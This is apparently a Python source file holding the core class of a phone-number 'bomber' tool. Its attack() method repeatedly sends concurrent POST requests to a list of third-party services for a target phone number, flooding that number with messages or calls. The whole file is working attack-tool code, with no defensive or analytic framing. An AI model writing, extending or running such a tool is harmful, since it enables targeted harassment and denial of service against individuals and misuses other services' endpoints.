import asyncio
from typing import Union

from loguru import logger

from . import sender, preparer
from .cache import ServicesCache
from .utils import pending_tasks


class AioBomber:
    def __init__(self, loop: asyncio.AbstractEventLoop = None, path_to_service: str = None) -> None:
        self.sender = sender.Sender()
        self._preparer = preparer.InformationPreparer()
        self._cache = ServicesCache()
        self._loop = loop or self._get_loop()
        self.path_to_service = path_to_service

    @staticmethod
    def _get_loop() -> asyncio.AbstractEventLoop:
        try:
            loop = asyncio.get_running_loop()
        except RuntimeError:
            loop = asyncio.get_event_loop()
        logger.debug(f'Event loop received: {loop}')
        return loop

    async def attack(self,
                     number_of_cycles: int,
                     phone: str,
                     is_waiting_tasks: bool = True,
                     is_auto_close_session: bool = True,
                     is_use_cache: bool = True) -> None:
        logger.info('Start attack')
        services = await self.sender.get_services(self.path_to_service)
        for _ in range(number_of_cycles):
            if not len(self._cache):
                self._attacker_with_data(phone=phone, services=services, save_to_cache=is_use_cache)
            else:
                self._attacker_with_cache(cache=self._cache)
        if is_waiting_tasks:
            await pending_tasks()
        if is_auto_close_session:
            await self.sender.close_session()

    def _attacker_with_data(self, phone: str, services: Union[dict, list], save_to_cache: bool = True) -> None:
        for value in services:
            model = self._preparer.get_service_model(value, phone)
            if save_to_cache:
                self._cache.add_item(model)
            self._loop.create_task(self.sender.post(**model.generator_args()))

    def _attacker_with_cache(self, cache: ServicesCache) -> None:
        for value in cache.get_dict_values():
            self._loop.create_task(self.sender.post(**value))
